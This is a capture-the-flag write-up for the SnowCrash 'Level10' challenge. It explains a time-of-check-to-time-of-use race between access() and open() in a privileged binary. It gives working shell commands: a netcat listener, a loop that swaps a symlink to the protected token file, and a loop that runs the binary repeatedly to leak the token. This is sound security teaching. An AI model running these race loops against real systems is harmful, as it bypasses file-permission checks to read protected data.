# Level10

**Box**: SnowCrash

**Name**: Level10

**Category**: Race Condition / TOCTOU

**Difficulty**: Hard

## Analysis

Explore the directory:

```bash
ls -la
```

I find a binary `level10` and a file `token`. The objective is to read the token file.

I first try to run the binary, it ask for a file and a host. I have no right on token file, and with my own file i still don't have a host.

After decompiling the binary (e.g., with Ghidra), I observe the following behavior:

The program accepts two arguments:
- a file path
- an IP address

It checks file access:
```c
access(file, R_OK);
```

If access is granted:
- Opens a TCP connection to host:6969
- Opens the file
- Reads its content
- Sends it to the server via socket

Simplified pseudo-code:
```c
if (access(file, R_OK) == 0) {
    connect(host, 6969);
    fd = open(file);
    read(fd, buffer);
    write(socket, buffer);
}
```

## Vulnerability Identification

The program uses this pattern:
```c
access(file)
open(file)
```

These two operations are **not atomic**.

Between the two calls, the file can be modified.

This creates a vulnerability called:
**TOCTOU** (Time Of Check To Time Of Use)

## Exploitation Strategy

The goal is to:
1. Pass the `access()` check with a readable file
2. Replace this file with a symlink to `token`
3. Force `open()` to read the token

To increase success chances, we exploit the race condition with multiple loops.

## Exploitation Steps

### Terminal 1: Listen for data

The program sends the file to port 6969, so listen with netcat:

```bash
nc -lk 6969
```

### Terminal 2:  Swap the symlink

This loop continuously changes the symlink target:

```bash
while true; do
    ln -sf /tmp/myfile /tmp/exploit
    ln -sf /home/user/level10/token /tmp/exploit
done
```

- `/tmp/myfile` → readable file (for `access()`)
- `token` → protected file (for `open()`)

### Terminal 3: Run the binary repeatedly

```bash
while true; do
    /home/user/level10/level10 /tmp/exploit 127.0.0.1
done
```

Each execution attempts to read the file.

## Success

At some point:
- `access()` → sees `/tmp/myfile` (allowed)
- `open()`   → opens `token`

The token content is then sent to the server. Netcat displays the password for the next level.

## Conclusion

This exploitation relies on:
- A race condition
- The vulnerable pattern: `access()` then `open()`
- Using symlinks to dynamically replace the checked file

This technique bypasses access checks and reads a normally inaccessible file.

## Flag

**FLAG_FOUND**
